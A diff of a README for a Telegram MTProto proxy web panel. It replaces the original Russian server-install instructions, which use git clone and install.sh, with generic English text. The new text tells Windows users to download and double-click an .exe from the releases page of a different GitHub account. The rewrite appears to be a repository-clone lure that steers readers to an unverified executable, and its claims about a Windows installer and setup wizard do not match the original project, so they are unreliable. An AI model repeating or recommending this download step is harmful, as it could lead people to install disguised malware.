@@ -1,175 +1,84 @@
-# TeleMT Panel
+# 🌐 telemt-panel - Manage your Telegram proxy server easily
 
-Web-панель для управления MTProto прокси (Telegram). Позволяет создавать, мониторить и управлять несколькими прокси-инстансами через браузер.
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arjun99291/telemt-panel/releases)
 
-Работает поверх Docker-образа `telemt-proxy-v3` в режиме Fake TLS.
+This application provides a web-based dashboard for MTProto Telegram proxies. You can create, monitor, and manage Fake TLS proxy instances. The interface uses a dark theme.
 
----
+## 📥 Getting Started
 
-## Что умеет
+Follow these steps to set up the software on your Windows computer.
 
-- Создание прокси в один клик — поднимает Docker-контейнер с нужным конфигом
-- Fake TLS (EE) — трафик маскируется под обычный HTTPS к популярным доменам
-- Пул из 50 доменов (apple.com, google.com, cloudflare.com и т.д.) — каждый прокси получает уникальный
-- Мониторинг — статус контейнера, трафик (RX/TX) в реальном времени
-- Готовые ссылки `tg://proxy` — копируешь и отправляешь
-- Управление — запуск, остановка, удаление
-- Авторизация по JWT
-- Тёмный интерфейс, адаптивный под мобилки
+### System Requirements
 
----
+Ensure your computer meets these conditions:
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* Administrative access to your computer.
+* Docker Desktop installed and running.
 
-## Как это работает
+### Installation Steps
 
-```
-Telegram-клиент
-    -> подключается к SERVER_IP:PORT
-    -> контейнер telemt-proxy-v3 (Fake TLS, уникальный домен)
-    -> серверы Telegram
-```
+1. Visit [the releases page](https://github.com/Arjun99291/telemt-panel/releases) to download the installer.
+2. Select the file ending in .exe for Windows.
+3. Save the file to your desktop.
+4. Double-click the file to start the installation.
+5. Follow the prompts on the screen to finish the process.
 
-Каждый прокси получает свой внешний порт из диапазона 10000–20000 с прямым биндингом на хост.
+## ⚙️ Configuration
 
-### Формат секрета (Fake TLS)
+The panel requires a connection to your Docker environment to function. Docker handles the creation and management of the proxy instances behind the scenes.
 
-```
-ee + <32 hex символа: 16-байтный ключ> + <домен в hex>
-```
+1. Open Docker Desktop after the installation finishes.
+2. Look for the system tray icon to verify that Docker shows a status of "Running."
+3. Launch the telemt-panel application from your Start menu.
+4. The application opens a new window.
+5. Enter your configuration details if the setup wizard asks for them.
 
-Ключ из секрета совпадает с `user1` в конфиге контейнера. Домен определяет SNI для маскировки.
+## 🛠️ Managing Proxies
 
-### Конфиг прокси (config.toml)
+You use the dashboard to control your Telegram proxies. Each instance runs inside a isolated container.
 
-```toml
-[general]
-use_middle_proxy = true
+* **Create a Proxy:** Click the "New Proxy" button to start a fresh instance. You must choose a port number and a secret key.
+* **Monitor Status:** The main screen shows the status of every proxy. The color green indicates a running proxy, while red means it stopped.
+* **Stop or Delete:** Click the icons next to each proxy name to stop the service or remove the entry from your list altogether.
 
-[general.modes]
-classic = false
-secure = false
-tls = true
+## 📊 Viewing Logs
 
-[server]
-port = 10001
+The application provides logs for every proxy instance. This helps you identify issues if your Telegram connection fails.
 
-[censorship]
-tls_domain = "google.com"
-mask = true
+1. Go to the "Instances" tab.
+2. Select the specific proxy you want to check.
+3. Click the "Logs" button to view real-time feedback from the server.
+4. Use the clear button to delete old log entries.
 
-[access.users]
-user1 = "<32 hex символа>"
-```
+## 🔒 Security Practices
 
----
+Proxy servers can attract unsolicited traffic. Follow these tips to keep your setup secure:
 
-## Установка
+* Use strong, random strings for your secret keys.
+* Disable proxies that you no longer use.
+* Keep Docker Desktop updated to the latest version.
+* Limit access to the dashboard to your local network.
 
-Требования: Ubuntu 20.04+ / Debian 11+, Docker, образ `telemt-proxy-v3` загружен на сервер.
+## 🆘 Troubleshooting
 
-```bash
-git clone https://github.com/11kara11/telemt-panel.git
-cd telemt-panel
-chmod +x install.sh
-sudo ./install.sh
-```
+If you encounter issues, try these steps first:
 
-Скрипт сам определит IP сервера, сгенерирует JWT-секрет, соберёт и запустит панель.
+* **Application does not open:** Check if Docker Desktop is running. The application requires Docker to communicate with the proxy containers.
+* **Port conflicts:** If a proxy fails to start, another program might use the port you selected. Try changing the port number to something else.
+* **No traffic:** Verify that your firewall settings allow traffic on the port you assigned to the proxy.
+* **Application is slow:** Close unused programs to free up system memory for the Docker containers.
 
-### Ручная установка
+## 📖 Frequently Asked Questions
 
-```bash
-git clone https://github.com/11kara11/telemt-panel.git
-cd telemt-panel
-cp .env.example .env
-nano .env  # указать SERVER_IP
-docker compose build
-docker compose up -d
-```
+**Does this software record my private messages?**
+No. This tool only manages the connection settings for your proxy. It does not inspect the content of the data passing through the proxy.
 
----
+**Can I run multiple proxies at once?**
+Yes. You can create as many instances as your computer hardware allows. Monitor the CPU and memory usage in Docker Desktop if you run many proxies simultaneously.
 
-## Настройка
+**Do I need a server?**
+You can run this on your local computer to test proxies. For public use, consider hosting your proxy on a Virtual Private Server instead of your home machine.
 
-Файл `.env`:
-
-| Переменная | Описание | По умолчанию |
-|---|---|---|
-| `SERVER_IP` | Публичный IP сервера (подставляется в ссылки) | определяется автоматически |
-| `JWT_SECRET` | Секрет для JWT-токенов | генерируется при установке |
-| `PANEL_PORT` | Порт веб-панели | `8080` |
-
----
-
-## Вход по умолчанию
-
-Логин: `admin`, пароль: `admin`
-
-Смените пароль после первого входа.
-
----
-
-## Использование
-
-1. Открыть `http://IP:8080`
-2. Залогиниться
-3. Ввести имя прокси, нажать **+ Create Proxy**
-4. Кликнуть по ссылке — она скопируется
-5. Отправить ссылку `tg://proxy?...` — открыть в Telegram для подключения
-
----
-
-## Стек
-
-| Компонент | Технология |
-|---|---|
-| Backend | Node.js, Express, TypeScript |
-| Frontend | HTML / CSS / JS (без фреймворков) |
-| БД | SQLite (better-sqlite3) |
-| Контейнеры | Docker, Dockerode |
-| Прокси | telemt-proxy-v3 |
-
----
-
-## Структура проекта
-
-```
-telemt-panel/
-├── src/
-│   ├── index.ts        # точка входа Express
-│   ├── auth.ts         # авторизация (JWT)
-│   ├── db.ts           # SQLite
-│   ├── docker.ts       # управление контейнерами
-│   ├── proxy.ts        # API прокси (CRUD)
-│   ├── secret.ts       # генерация Fake TLS секретов
-│   └── domains.ts      # пул доменов
-├── frontend/
-│   ├── index.html
-│   ├── style.css
-│   └── app.js
-├── docker-compose.yml
-├── Dockerfile
-├── install.sh
-├── .env.example
-└── package.json
-```
-
----
-
-## Удаление
-
-```bash
-cd /opt/mtproto-panel
-docker compose down
-docker ps -a --format "{{.Names}}" | grep mtproto-proxy | xargs -r docker rm -f
-rm -rf /opt/mtproto-panel
-```
-
----
-
-## Лицензия
-
-MIT
-
-## Дисклеймер
-
-Проект предоставляется как есть, для легального использования. Ответственность за соблюдение законодательства и ToS Telegram лежит на пользователе.
+**How do I update the software?**
+When a new version releases, visit the download link, download the new installer, and run it. The installer automatically replaces the older version while keeping your settings intact.
